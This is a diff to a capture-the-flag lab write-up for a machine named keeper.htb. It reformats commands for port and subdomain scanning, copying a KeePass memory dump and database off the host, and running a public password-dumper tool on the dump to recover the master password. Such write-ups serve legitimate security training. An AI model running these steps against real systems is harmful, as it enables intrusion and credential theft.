@@ -6,11 +6,22 @@
 
 ## 🔍 Recon
 
+# Full port scan
 ```bash
-nmap -p- --min-rate 10000 10.10.11.227          # Full port scan
-nmap -p 22,80 -sCV 10.10.11.227                 # Version and script scan
+nmap -p- --min-rate 10000 10.10.11.227
+```
+ 
+ # Version and script scan
+```bash
+nmap -p 22,80 -sCV 10.10.11.227
+```
+
+```bash
 ffuf -u http://10.10.11.227 -H "Host: FUZZ.keeper.htb" \
      -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all
+```
+
+```bash
 echo "10.10.11.227 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
 ```
 
@@ -43,6 +54,9 @@ Files found:
 
 ```bash
 scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip .
+```
+
+```
 unzip RT30000.zip
 # -> KeePassDumpFull.dmp (RAM dump)
 # -> passcodes.kdbx (KeePass database)
@@ -61,6 +75,9 @@ unzip RT30000.zip
 ```powershell
 git clone https://github.com/vdohney/keepass-password-dumper
 cd keepass-password-dumper
+```
+
+```
 dotnet run Z:\path\to\KeePassDumpFull.dmp
 ```
 
@@ -68,6 +85,9 @@ dotnet run Z:\path\to\KeePassDumpFull.dmp
 
 ```bash
 docker run --rm -it -v $(pwd):/data mcr.microsoft.com/dotnet/sdk:7.0.100
+```
+
+```
 git clone https://github.com/vdohney/keepass-password-dumper
 cd keepass-password-dumper
 dotnet run /data/KeePassDumpFull.dmp
